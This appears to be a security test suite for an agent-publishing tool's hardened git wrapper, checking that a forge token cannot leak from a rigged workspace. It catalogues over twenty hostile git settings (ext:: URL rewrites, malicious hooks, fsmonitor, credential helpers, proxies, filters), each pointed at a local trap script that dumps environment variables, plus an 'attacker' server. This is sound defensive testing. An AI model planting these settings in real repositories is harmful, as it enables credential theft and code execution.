import assert from "node:assert/strict";
import { execFileSync, spawn } from "node:child_process";
import { existsSync, readdirSync, readFileSync } from "node:fs";
import { chmod, mkdtemp, mkdir, writeFile } from "node:fs/promises";
import { createServer, type IncomingMessage, type Server } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";

import { LocalExecutor, type AgentExecutor } from "@neutron-build/agents";

import { commitAndPush, gitCredential, parseRepoUrl, rebaseOntoBase, recordBaseSha, reuseRepo, setupRepo, type RepoRef } from "./git.js";
import { HARDENED_REFUSAL_EXIT, hardenedGitScript } from "./git-hardened.js";

/**
 * SHIP-02 tier 1. A forge that REQUIRES the credential (git's smart HTTP
 * backend behind Basic auth), a workspace the "agent" has rigged, and Ship's
 * own clone / fetch / push run against it. The token must reach the forge and
 * nothing else: no program the workspace names, no file it can read, no other
 * server.
 */

const TOKEN = "FAKE_FORGE_TOKEN_0123456789";
const BASIC = Buffer.from(`${TOKEN}:`).toString("base64");
/** Every spelling of the credential a leak could take. */
const SECRETS = [TOKEN, BASIC, Buffer.from(TOKEN).toString("base64").slice(0, 24)];

const HTTP_BACKEND = (() => {
  try {
    const path = join(execFileSync("git", ["--exec-path"], { encoding: "utf8" }).trim(), "git-http-backend");
    return existsSync(path) ? path : null;
  } catch {
    return null;
  }
})();
const SKIP = HTTP_BACKEND === null ? "git-http-backend is not installed" : false;

interface Forge {
  ref: RepoRef;
  bare: string;
  /** Requests that carried the right credential / any Authorization header at all. */
  authed: number;
  close(): Promise<void>;
}

function listen(server: Server): Promise<number> {
  return new Promise((resolve) => server.listen(0, "127.0.0.1", () => resolve((server.address() as { port: number }).port)));
}

/** git-http-backend as CGI, behind token-as-username Basic auth — the scheme Forgejo and GitHub accept. */
async function forge(root: string): Promise<Forge> {
  const state = { authed: 0 };
  const server = createServer((req, res) => {
    if (req.headers.authorization !== `Basic ${BASIC}`) {
      res.writeHead(401, { "www-authenticate": 'Basic realm="forge"' }).end("auth required");
      return;
    }
    state.authed += 1;
    const url = new URL(req.url ?? "/", "http://forge");
    const cgi = spawn(HTTP_BACKEND!, [], {
      env: {
        PATH: process.env.PATH ?? "",
        GIT_PROJECT_ROOT: root,
        GIT_HTTP_EXPORT_ALL: "1",
        GIT_CONFIG_GLOBAL: "/dev/null",
        REQUEST_METHOD: req.method ?? "GET",
        PATH_INFO: decodeURIComponent(url.pathname),
        QUERY_STRING: url.search.slice(1),
        CONTENT_TYPE: req.headers["content-type"] ?? "",
        ...(req.headers["content-length"] !== undefined ? { CONTENT_LENGTH: req.headers["content-length"] } : {}),
        ...(req.headers["content-encoding"] !== undefined ? { HTTP_CONTENT_ENCODING: String(req.headers["content-encoding"]) } : {}),
        ...(req.headers["git-protocol"] !== undefined ? { GIT_PROTOCOL: String(req.headers["git-protocol"]) } : {}),
        REMOTE_USER: "ship",
        REMOTE_ADDR: "127.0.0.1",
      },
    });
    req.pipe(cgi.stdin);
    cgi.stdin.on("error", () => undefined);
    let head = Buffer.alloc(0);
    let sent = false;
    cgi.stdout.on("data", (chunk: Buffer) => {
      if (sent) return void res.write(chunk);
      head = Buffer.concat([head, chunk]);
      const crlf = head.indexOf("\r\n\r\n");
      const lf = head.indexOf("\n\n");
      const end = crlf !== -1 && (lf === -1 || crlf < lf) ? crlf : lf;
      if (end === -1) return;
      const skip = end === crlf ? 4 : 2;
      let status = 200;
      const headers: Record<string, string> = {};
      for (const line of head.subarray(0, end).toString("latin1").split(/\r?\n/)) {
        const colon = line.indexOf(":");
        if (colon === -1) continue;
        const name = line.slice(0, colon).trim().toLowerCase();
        const value = line.slice(colon + 1).trim();
        if (name === "status") status = Number(value.split(" ")[0]);
        else headers[name] = value;
      }
      res.writeHead(status, headers);
      res.write(head.subarray(end + skip));
      sent = true;
    });
    cgi.on("close", () => {
      if (!sent) res.writeHead(500);
      res.end();
    });
  });
  const port = await listen(server);
  const base = `http://127.0.0.1:${port}`;
  return {
    ref: { kind: "forgejo", base, owner: "acme", repo: "app", cloneUrl: `${base}/acme/app.git` },
    bare: join(root, "acme", "app.git"),
    get authed() {
      return state.authed;
    },
    close: () => new Promise<void>((resolve) => server.close(() => resolve())),
  };
}

/** Somewhere a redirected push or fetch would land: records what it is sent, answers 404. */
async function attacker(): Promise<{ origin: string; hostport: string; requests: Array<{ url: string; authorization: string | undefined }>; close(): Promise<void> }> {
  const requests: Array<{ url: string; authorization: string | undefined }> = [];
  const server = createServer((req: IncomingMessage, res) => {
    requests.push({ url: req.url ?? "", authorization: req.headers.authorization ?? (req.headers["proxy-authorization"] as string | undefined) });
    req.resume();
    res.writeHead(404).end("no");
  });
  server.on("connect", (req, socket) => {
    requests.push({ url: `CONNECT ${req.url}`, authorization: req.headers.authorization });
    socket.end("HTTP/1.1 404 Not Found\r\n\r\n");
  });
  const port = await listen(server);
  return { origin: `http://127.0.0.1:${port}`, hostport: `127.0.0.1:${port}`, requests, close: () => new Promise<void>((resolve) => server.close(() => resolve())) };
}

interface Rig {
  forge: Forge;
  evil: Awaited<ReturnType<typeof attacker>>;
  /** The workspace. */
  dir: string;
  /** Where the trap writes; outside the workspace so `git add -A` never sees it. */
  leaks: string;
  /** `sh <trap>` — the program every hostile setting points at. */
  trap: string;
  seed: LocalExecutor;
  work: AgentExecutor & { calls: Array<{ command: string; env: Record<string, string> | undefined }> };
}

/** A forge with history, a seed clone to move it, and a workspace cloned the way a run's is. */
async function rig(name: string, executorEnv: (rig: { dir: string; trap: string; leaks: string }) => Record<string, string> = () => ({})): Promise<Rig> {
  const root = await mkdtemp(join(tmpdir(), `${name}-forge-`));
  const f = await forge(root);
  await mkdir(join(root, "acme"), { recursive: true });
  const seedDir = await mkdtemp(join(tmpdir(), `${name}-seed-`));
  const seed = new LocalExecutor({ root: seedDir, env: { GIT_CONFIG_GLOBAL: "/dev/null" } });
  const seeded = await seed.exec(
    "git init -q -b main . && git config user.email t@t && git config user.name t && " +
      "echo one > f.txt && git add -A && git commit -qm one && echo two >> f.txt && git commit -qam two && " +
      `git clone -q --bare . ${f.bare} && git -C ${f.bare} config http.receivepack true`,
  );
  assert.equal(seeded.exitCode, 0, seeded.stderr);
  const dir = await mkdtemp(join(tmpdir(), `${name}-work-`));
  const leaks = await mkdtemp(join(tmpdir(), `${name}-leaks-`));
  const trapFile = join(leaks, "trap.sh");
  // Whatever runs this records everything it could know: its arguments, its
  // environment, and — where /proc exists — its parent's environment.
  await writeFile(
    trapFile,
    "#!/bin/sh\n" +
      `out="${leaks}/leak-$$-$(date +%s%N)"\n` +
      `{ echo "ARGS $*"; env; cat "/proc/$PPID/environ" 2>/dev/null | tr '\\0' '\\n'; } > "$out" 2>/dev/null\n` +
      "exit 1\n",
  );
  await chmod(trapFile, 0o755);
  const trap = `sh ${trapFile}`;
  const inner = new LocalExecutor({ root: dir, env: { ...executorEnv({ dir, trap, leaks }) } });
  const calls: Rig["work"]["calls"] = [];
  const work = {
    calls,
    async exec(command: string, options?: Parameters<LocalExecutor["exec"]>[1]) {
      calls.push({ command, env: options?.env });
      return inner.exec(command, options);
    },
    putFile: inner.putFile.bind(inner),
    getFile: inner.getFile.bind(inner),
    destroy: inner.destroy.bind(inner),
  } as unknown as Rig["work"];
  return { forge: f, evil: await attacker(), dir, leaks, trap, seed, work };
}

async function close(r: Rig): Promise<void> {
  await r.forge.close();
  await r.evil.close();
}

/** Everything the trap wrote, as one string. */
function leaked(r: Rig): string {
  return readdirSync(r.leaks)
    .filter((name) => name.startsWith("leak-"))
    .map((name) => readFileSync(join(r.leaks, name), "utf8"))
    .join("\n");
}

/** The credential reached nothing the workspace controls. */
function assertNoLeak(r: Rig, label: string): void {
  const dump = leaked(r);
  for (const secret of SECRETS) assert.ok(!dump.includes(secret), `${label}: the credential reached a program the workspace named`);
  for (const request of r.evil.requests) {
    assert.equal(request.authorization, undefined, `${label}: the credential was sent to another server (${request.url})`);
  }
  // No file in the workspace holds it either — config, hooks, packed refs, logs.
  const grep = execFileSync("sh", ["-c", `grep -rIl -e ${TOKEN} -e ${BASIC} . 2>/dev/null || true`], { cwd: r.dir, encoding: "utf8" });
  assert.equal(grep.trim(), "", `${label}: the credential is in a workspace file`);
}

/** The wrapper's invariants, checked on every command the run issued. */
function assertCallDiscipline(r: Rig, label: string): void {
  const marker = "ship_git_here() {";
  for (const call of r.work.calls) {
    const credentialed = call.env?.GIT_CONFIG_VALUE_0 !== undefined;
    const at = call.command.indexOf(marker);
    if (credentialed) {
      assert.ok(at !== -1, `${label}: a credential was handed to a command outside the hardened wrapper: ${call.command.slice(0, 120)}`);
      const body = call.command.slice(call.command.indexOf("\n", at) + 1);
      assert.ok(!/(^|[^_a-z-])git\s/.test(body), `${label}: an ordinary git command shares a shell with the credential: ${body}`);
    }
    assert.ok(!call.command.includes(TOKEN) && !call.command.includes(BASIC), `${label}: the credential is on a command line`);
  }
}

async function remoteSha(r: Rig, branch: string): Promise<string> {
  return (await r.seed.exec(`git --git-dir=${r.forge.bare} rev-parse refs/heads/${branch}`)).stdout.trim();
}

/** Hostile workspace states. `plant` is what the agent (or the repo's test command) runs before Ship publishes. */
interface Hostile {
  name: string;
  plant: (r: Rig) => string;
  /**
   * What an ORDINARY credentialed `git push` does in this workspace — the
   * control that proves the setting is live, not inert: "exec" = it runs the
   * trap with the credential in reach; "redirect" = it contacts the other
   * server; undefined = no control (the setting only bites on some platforms,
   * or needs a condition this rig does not create).
   */
  control?: "exec" | "redirect";
}

const HOSTILE: Hostile[] = [
  {
    // The reviewer's reproduction (wave-1 report, SHIP-02), unchanged in substance.
    name: "url.insteadOf onto an ext:: transport",
    plant: (r) => `git config protocol.ext.allow always && git config 'url.ext::${r.trap} .insteadOf' ${r.forge.ref.base}/`,
    control: "exec",
  },
  { name: "url.pushInsteadOf onto an ext:: transport", plant: (r) => `git config protocol.ext.allow always && git config 'url.ext::${r.trap} .pushInsteadOf' ${r.forge.ref.base}/`, control: "exec" },
  { name: "url.insteadOf onto another server", plant: (r) => `git config url.${r.evil.origin}/.insteadOf ${r.forge.ref.base}/`, control: "redirect" },
  { name: "url.pushInsteadOf onto another server", plant: (r) => `git config url.${r.evil.origin}/.pushInsteadOf ${r.forge.ref.base}/`, control: "redirect" },
  { name: "remote.origin.url and pushurl changed", plant: (r) => `git config remote.origin.url ${r.evil.origin}/x/y.git && git config remote.origin.pushurl ${r.evil.origin}/x/y.git` },
  { name: "core.fsmonitor", plant: (r) => `git config core.fsmonitor '${r.trap}'` },
  { name: "core.sshCommand with the remote rewritten to ssh", plant: (r) => `git config core.sshCommand '${r.trap}' && git config url.ssh://git@forge.invalid/.insteadOf ${r.forge.ref.base}/`, control: "exec" },
  {
    name: "core.hooksPath (pre-push, reference-transaction, post-checkout, pre-auto-gc)",
    plant: (r) =>
      `mkdir -p .git/evil-hooks && for h in pre-push reference-transaction post-checkout pre-auto-gc post-merge pre-commit; do printf '#!/bin/sh\\n${r.trap} hook "$@"\\nexit 0\\n' > .git/evil-hooks/$h; chmod +x .git/evil-hooks/$h; done && git config core.hooksPath .git/evil-hooks`,
    control: "exec",
  },
  {
    name: "hooks in .git/hooks",
    plant: (r) => `for h in pre-push reference-transaction post-checkout pre-auto-gc; do printf '#!/bin/sh\\n${r.trap} hook "$@"\\nexit 0\\n' > .git/hooks/$h; chmod +x .git/hooks/$h; done`,
    control: "exec",
  },
  { name: "credential.helper", plant: (r) => `git config credential.helper '!${r.trap}' && git config credential.${r.forge.ref.base}.helper '!${r.trap}'` },
  { name: "core.askPass", plant: (r) => `git config core.askPass '${r.leaks}/trap.sh'` },
  { name: "http.proxy", plant: (r) => `git config http.proxy ${r.evil.origin}`, control: "redirect" },
  { name: "http.<url>.proxy, more specific than any override", plant: (r) => `git config http.${r.forge.ref.cloneUrl}.proxy ${r.evil.origin}`, control: "redirect" },
  { name: "http.<url>.extraHeader and http.curloptResolve", plant: (r) => `git config http.${r.forge.ref.base}/.extraHeader 'X-Evil: 1' && git config http.curloptResolve '127.0.0.1:${new URL(r.forge.ref.base).port}:192.0.2.1'` },
  { name: "core.gitProxy with the remote rewritten to git://", plant: (r) => `git config core.gitProxy '${r.leaks}/trap.sh' && git config url.git://forge.invalid/.insteadOf ${r.forge.ref.base}/`, control: "exec" },
  { name: "protocol.* opened up", plant: () => "git config protocol.allow always && git config protocol.ext.allow always && git config protocol.file.allow always" },
  {
    name: "include.path",
    plant: (r) => `printf '[protocol "ext"]\\n\\tallow = always\\n[url "ext::${r.trap} "]\\n\\tinsteadOf = ${r.forge.ref.base}/\\n' > .git/evil.inc && git config include.path evil.inc`,
    control: "exec",
  },
  {
    name: "includeIf",
    plant: (r) => `printf '[protocol "ext"]\\n\\tallow = always\\n[url "ext::${r.trap} "]\\n\\tinsteadOf = ${r.forge.ref.base}/\\n' > .git/evil.inc && git config 'includeIf.gitdir:**.path' evil.inc`,
    control: "exec",
  },
  {
    name: "worktree config (extensions.worktreeConfig)",
    plant: (r) => `git config extensions.worktreeConfig true && git config --worktree protocol.ext.allow always && git config --worktree 'url.ext::${r.trap} .insteadOf' ${r.forge.ref.base}/`,
    control: "exec",
  },
  { name: "remote.origin.uploadpack / receivepack", plant: (r) => `git config remote.origin.uploadpack '${r.trap}' && git config remote.origin.receivepack '${r.trap}'` },
  {
    name: "filters (clean / smudge / process) on every path",
    plant: (r) => `git config filter.evil.clean '${r.trap} clean; cat' && git config filter.evil.smudge '${r.trap} smudge; cat' && echo '* filter=evil' > .git/info/attributes`,
  },
  {
    name: "core.alternateRefsCommand with an alternate",
    plant: (r) => `mkdir -p .git/alt/objects && echo "$PWD/.git/alt/objects" > .git/objects/info/alternates && git config core.alternateRefsCommand '${r.trap}'`,
  },
  { name: "push.gpgSign with gpg.program", plant: (r) => `git config push.gpgSign true && git config gpg.program '${r.leaks}/trap.sh'` },
  { name: "core.pager and pager.<command>", plant: (r) => `git config core.pager '${r.trap}' && git config pager.push true && git config pager.fetch true` },
  {
    name: "a submodule with its own rigged config, and recursion turned on",
    plant: (r) =>
      // Hidden from `git add -A`: Ship's publish screen refuses a gitlink outright.
      `echo sub/ >> .git/info/exclude && git init -q sub && git -C sub config user.email a@b && git -C sub config user.name x && git -C sub commit -q --allow-empty -m s && ` +
      `git -C sub config core.fsmonitor '${r.trap}' && git -C sub config core.hooksPath /nonexistent && ` +
      "git config push.recurseSubmodules on-demand && git config fetch.recurseSubmodules true && git config submodule.recurse true",
  },
  {
    name: "remote.pushDefault, branch.*.pushRemote and a second remote",
    plant: (r) => `git remote add evil ${r.evil.origin}/x/y.git && git config remote.pushDefault evil && git config branch.main.pushRemote evil && git config push.default matching`,
  },
];

/** A run's repo-setup step: the credentialed clone and the recorded base sha. */
async function checkedOut(r: Rig): Promise<{ checkout: Awaited<ReturnType<typeof setupRepo>> }> {
  return { checkout: await recordBaseSha(r.work, r.forge.ref, TOKEN, await setupRepo(r.work, { ref: r.forge.ref, token: TOKEN, runId: "run-1" })) };
}

for (const hostile of HOSTILE) {
  test(`SHIP-02: ${hostile.name} — the token reaches the forge and nothing the workspace controls`, { skip: SKIP }, async () => {
    const r = await rig("git-hardened");
    try {
      const { checkout } = await checkedOut(r);
      assert.match(checkout.baseSha ?? "", /^[0-9a-f]{40}$/, "the base sha was recorded through the hardened fetch");

      // ── The agent's turn: an edit, and the rigging. ──
      const planted = await r.work.exec(`echo change > change.txt && ${hostile.plant(r)}`);
      assert.equal(planted.exitCode, 0, `planting failed: ${planted.stderr}`);

      // ── Control: an ordinary credentialed push in this workspace is what leaks. ──
      if (hostile.control !== undefined) {
        const cred = gitCredential(r.forge.ref, TOKEN, "env");
        await r.work.exec(`git push ${cred.url} HEAD:refs/heads/control 2>&1`, { timeoutMs: 60_000, env: cred.env! });
        if (hostile.control === "exec") {
          assert.ok(leaked(r).includes(BASIC), "control: an unhardened push hands the credential to the workspace's program");
        } else {
          assert.ok(r.evil.requests.length > 0, "control: an unhardened push goes to the other server");
        }
        // Start the real measurement clean.
        for (const name of readdirSync(r.leaks)) if (name.startsWith("leak-")) execFileSync("rm", ["-f", join(r.leaks, name)]);
        r.evil.requests.length = 0;
        r.work.calls.length = 0;
      }

      // ── Ship publishes. ──
      const authedBefore = r.forge.authed;
      const pushed = await commitAndPush(r.work, { ref: r.forge.ref, token: TOKEN, checkout, message: "fix" });
      assert.equal(pushed.kind, "pushed", "the push went through");
      assert.ok(pushed.kind === "pushed" && pushed.sha === (await remoteSha(r, checkout.branch)), "the forge holds exactly the commit Ship pushed");
      assert.ok(r.forge.authed > authedBefore, "the forge saw the credential");
      assertNoLeak(r, "push");
      assert.equal(r.evil.requests.length, 0, "nothing was sent to the other server");

      // ── The base moves; Ship fetches it and rebases (fetch + force-with-lease push). ──
      const moved = await r.seed.exec(`echo three >> f.txt && git commit -qam three && git push -q ${r.forge.bare} main`);
      assert.equal(moved.exitCode, 0, moved.stderr);
      const rebased = await rebaseOntoBase(r.work, { ref: r.forge.ref, token: TOKEN, checkout });
      // A rigged workspace can break ITS OWN rebase (a filter or hook that
      // exits 1 does); what it cannot do is see the credential. The fetch is
      // the hardened half and must have happened either way.
      assert.equal((await r.work.exec("git rev-parse FETCH_HEAD")).stdout.trim(), await remoteSha(r, "main"), `the hardened fetch brought the new base (${JSON.stringify(rebased)})`);
      if (rebased.kind === "rebased") assert.equal(rebased.sha, await remoteSha(r, checkout.branch), "the rebased commit was force-pushed");
      assertNoLeak(r, "rebase");

      // ── A later run reuses the same (still rigged) warm volume. ──
      const reused = await reuseRepo(r.work, { ref: r.forge.ref, token: TOKEN, runId: "run-2" }).catch((error: Error) => error);
      if (!(reused instanceof Error)) assert.equal(reused.base, "main");
      assert.equal((await r.work.exec("git rev-parse refs/remotes/origin/main")).stdout.trim(), await remoteSha(r, "main"), "the hardened warm fetch updated the remote-tracking ref");
      assertNoLeak(r, "warm reuse");
      assert.equal(r.evil.requests.length, 0, "nothing was sent to the other server");
      assertCallDiscipline(r, hostile.name);
    } finally {
      await close(r);
    }
  });
}

test("SHIP-02: GIT_* variables and a global gitconfig in the executor's environment are not inherited", { skip: SKIP }, async () => {
  let home = "";
  const r = await rig("git-hardened-env", ({ trap, leaks }) => {
    home = join(leaks, "home");
    return {
      HOME: home,
      XDG_CONFIG_HOME: join(home, ".config"),
      GIT_SSH_COMMAND: trap,
      GIT_SSH: join(leaks, "trap.sh"),
      GIT_PROXY_COMMAND: join(leaks, "trap.sh"),
      GIT_ASKPASS: join(leaks, "trap.sh"),
      SSH_ASKPASS: join(leaks, "trap.sh"),
      GIT_CONFIG_SYSTEM: join(leaks, "system.gitconfig"),
      GIT_TRACE: join(leaks, "leak-trace"),
      GIT_TRACE_CURL: join(leaks, "leak-trace-curl"),
      GIT_TRACE_REDACT: "0",
      GIT_CURL_VERBOSE: "1",
      GIT_EXEC_PATH: join(leaks, "no-such-exec-path"),
    };
  });
  try {
    const rewrite = `[protocol "ext"]\n\tallow = always\n[url "ext::${r.trap} "]\n\tinsteadOf = ${r.forge.ref.base}/\n[core]\n\tfsmonitor = ${r.trap}\n`;
    await mkdir(join(home, ".config", "git"), { recursive: true });
    await writeFile(join(home, ".gitconfig"), rewrite);
    await writeFile(join(home, ".config", "git", "config"), rewrite);
    await writeFile(join(r.leaks, "system.gitconfig"), rewrite);

    const { checkout } = await checkedOut(r);
    await r.work.exec("git config user.email a@b; git config user.name x; echo change > change.txt");
    const pushed = await commitAndPush(r.work, { ref: r.forge.ref, token: TOKEN, checkout, message: "fix" });
    assert.equal(pushed.kind, "pushed");
    assert.ok(pushed.kind === "pushed" && pushed.sha === (await remoteSha(r, checkout.branch)));
    assertNoLeak(r, "environment");
    assertCallDiscipline(r, "environment");
  } finally {
    await close(r);
  }
});

test("SHIP-02: the legacy argv credential mode goes through the same hardened git", { skip: SKIP }, async () => {
  const was = process.env.SHIP_GIT_CREDENTIAL;
  process.env.SHIP_GIT_CREDENTIAL = "argv";
  const r = await rig("git-hardened-argv");
  try {
    const { checkout } = await checkedOut(r);
    const reviewer = HOSTILE[0]!;
    await r.work.exec(`echo change > change.txt && ${reviewer.plant(r)}`);
    const pushed = await commitAndPush(r.work, { ref: r.forge.ref, token: TOKEN, checkout, message: "fix" });
    assert.equal(pushed.kind, "pushed");
    // argv mode is the documented weaker mode — the token is on the command
    // line by definition — but the workspace's config still decides nothing.
    for (const secret of [TOKEN, BASIC]) assert.ok(!leaked(r).includes(secret), "the workspace's program never ran with the credential");
    assert.equal(r.evil.requests.length, 0);
    assert.ok(!readFileSync(join(r.dir, ".git", "config"), "utf8").includes(TOKEN), "the token is not left in .git/config");
  } finally {
    if (was === undefined) delete process.env.SHIP_GIT_CREDENTIAL;
    else process.env.SHIP_GIT_CREDENTIAL = was;
    await close(r);
  }
});

test("SHIP-02: the hardened git refuses to run when configuration it cannot ignore rewrites the remote", async () => {
  // The system gitconfig is the one file the wrapper still reads. If IT sends
  // the recorded URL somewhere else, the step is refused, not followed.
  const dir = await mkdtemp(join(tmpdir(), "git-hardened-refuse-"));
  const work = new LocalExecutor({ root: dir });
  await work.exec("git init -q -b main . && git config user.email a@b && git config user.name x && git commit -q --allow-empty -m one");
  // GIT_CONFIG_SYSTEM is scrubbed with every other GIT_*, so the rewrite is
  // put where git looks without it: this drives the script's own check.
  const script = hardenedGitScript("http://forge.invalid/acme/app.git", 'ship_git ls-remote "$SHIP_GIT_URL" 2>&1').replace("exec git ", `exec git -c 'url.http://127.0.0.1:9/elsewhere/.insteadOf=http://forge.invalid/' `);
  const result = await work.exec(script, { timeoutMs: 60_000 });
  assert.equal(result.exitCode, HARDENED_REFUSAL_EXIT);
  assert.match(result.stdout + result.stderr, /rewrites the remote URL/);
});

test("SHIP-02: the wrapper refuses a remote it was not built for, and a workspace with no repository", async () => {
  assert.throws(() => hardenedGitScript("ssh://git@forge.example/a/b.git", "ship_git fetch"), /neither http\(s\) nor a local path/);
  assert.throws(() => hardenedGitScript("ext::sh -c evil", "ship_git fetch"), /malformed|neither/);
  assert.throws(() => hardenedGitScript("http://forge.example/a/b.git\nevil", "ship_git fetch"), /malformed/);
  const dir = await mkdtemp(join(tmpdir(), "git-hardened-empty-"));
  const work = new LocalExecutor({ root: dir });
  const result = await work.exec(hardenedGitScript("http://forge.invalid/a/b.git", 'ship_git fetch "$SHIP_GIT_URL" main'), { timeoutMs: 60_000 });
  assert.equal(result.exitCode, HARDENED_REFUSAL_EXIT);
  // A symlinked .git is somebody else's repository, with somebody else's objects.
  const other = await mkdtemp(join(tmpdir(), "git-hardened-other-"));
  await new LocalExecutor({ root: other }).exec("git init -q .");
  await work.exec(`ln -s ${other}/.git .git`);
  assert.equal((await work.exec(hardenedGitScript("http://forge.invalid/a/b.git", 'ship_git fetch "$SHIP_GIT_URL" main'), { timeoutMs: 60_000 })).exitCode, HARDENED_REFUSAL_EXIT);
});

test("SHIP-02: the credential is exported to the hardened git only — not to the shell's other children", async () => {
  const dir = await mkdtemp(join(tmpdir(), "git-hardened-scope-"));
  const work = new LocalExecutor({ root: dir, env: { GIT_SSH_COMMAND: "inherited", GIT_AUTHOR_NAME: "inherited" } });
  await work.exec("git init -q -b main . && git config user.email a@b && git config user.name x && git commit -q --allow-empty -m one");
  const cred = gitCredential(parseRepoUrl("http://forge.invalid/acme/app.git"), TOKEN, "env");
  const result = await work.exec(
    hardenedGitScript(cred.url, 'echo "OUTSIDE:"; env; echo "INSIDE:"; ship_git config --show-origin --get-regexp "^http\\..*extraheader$"; echo "PLAIN:"; ship_git_plain config --get-regexp "^http\\..*extraheader$"; ship_git_plain var GIT_AUTHOR_IDENT >/dev/null 2>&1; true'),
    { timeoutMs: 60_000, env: cred.env! },
  );
  const [outside, rest] = result.stdout.split("INSIDE:") as [string, string];
  const [inside, plain] = rest.split("PLAIN:") as [string, string];
  assert.ok(!outside.includes(BASIC), "a sibling process of the hardened git has no credential in its environment");
  assert.ok(!/^GIT_/m.test(outside.replace("OUTSIDE:", "")), `no GIT_* variable survives the scrub: ${outside.match(/^GIT_.*$/m)?.[0]}`);
  assert.ok(inside.includes(BASIC), "the hardened git itself has it");
  assert.ok(!plain.includes(BASIC), "the credential-free hardened git does not");
});

test("SHIP-02: sha256 repositories go through the shadow too", async (t) => {
  const bare = await mkdtemp(join(tmpdir(), "git-hardened-sha256-bare-"));
  const dir = await mkdtemp(join(tmpdir(), "git-hardened-sha256-"));
  const work = new LocalExecutor({ root: dir, env: { GIT_CONFIG_GLOBAL: "/dev/null" } });
  const made = await work.exec(
    `git init -q --object-format=sha256 --bare ${bare}/repo.git && git init -q --object-format=sha256 -b main . && git config user.email a@b && git config user.name x && ` +
      "echo one > f.txt && git add -A && git commit -qm one && git rev-parse HEAD",
  );
  if (made.exitCode !== 0) return t.skip("this git has no sha256 support");
  const sha = made.stdout.trim();
  const ref = { kind: "forgejo" as const, base: "file://", owner: "local", repo: "repo", cloneUrl: `${bare}/repo.git` };
  const pushed = await commitAndPush(work, { ref, token: "", checkout: { branch: "ship/sha256", base: "main", baseSha: sha }, message: "fix" });
  assert.equal(pushed.kind, "empty", "nothing ahead of the base yet");
  await work.exec("echo two >> f.txt");
  const again = await commitAndPush(work, { ref, token: "", checkout: { branch: "ship/sha256", base: "main", baseSha: sha }, message: "fix" });
  assert.equal(again.kind, "pushed");
  assert.equal(again.kind === "pushed" && again.sha.length, 64);
  assert.equal((await work.exec(`git --git-dir=${bare}/repo.git rev-parse refs/heads/ship/sha256`)).stdout.trim(), again.kind === "pushed" ? again.sha : "");
});

test("SHIP-02: reftable repositories go through the shadow too", async (t) => {
  const bare = await mkdtemp(join(tmpdir(), "git-hardened-reftable-bare-"));
  const dir = await mkdtemp(join(tmpdir(), "git-hardened-reftable-"));
  const work = new LocalExecutor({ root: dir, env: { GIT_CONFIG_GLOBAL: "/dev/null" } });
  const made = await work.exec(
    `git init -q --bare -b main ${bare}/repo.git && git init -q --ref-format=reftable -b main . && git config user.email a@b && git config user.name x && ` +
      `echo one > f.txt && git add -A && git commit -qm one && git push -q ${bare}/repo.git main && git rev-parse HEAD`,
  );
  if (made.exitCode !== 0) return t.skip("this git has no reftable support");
  const base = made.stdout.trim();
  const ref = { kind: "forgejo" as const, base: "file://", owner: "local", repo: "repo", cloneUrl: `${bare}/repo.git` };
  // A fetch writes a ref through the shadow; a push reads objects through it.
  const recorded = await recordBaseSha(work, ref, "", { branch: "ship/reftable", base: "main" });
  assert.equal(recorded.baseSha, base);
  assert.equal((await work.exec("git rev-parse refs/remotes/origin/main")).stdout.trim(), base, "the fetched ref is visible to the workspace's own git");
  await work.exec("git checkout -q -b ship/reftable && echo two >> f.txt");
  const pushed = await commitAndPush(work, { ref, token: "", checkout: recorded, message: "fix" });
  assert.equal(pushed.kind, "pushed");
  assert.equal((await work.exec(`git --git-dir=${bare}/repo.git rev-parse refs/heads/ship/reftable`)).stdout.trim(), pushed.kind === "pushed" ? pushed.sha : "");
});
